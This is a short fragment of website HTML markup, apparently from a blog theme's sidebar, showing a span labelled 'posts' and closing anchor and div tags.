           <span class="site-state-item-name">posts</span>
         </a>
       </div>
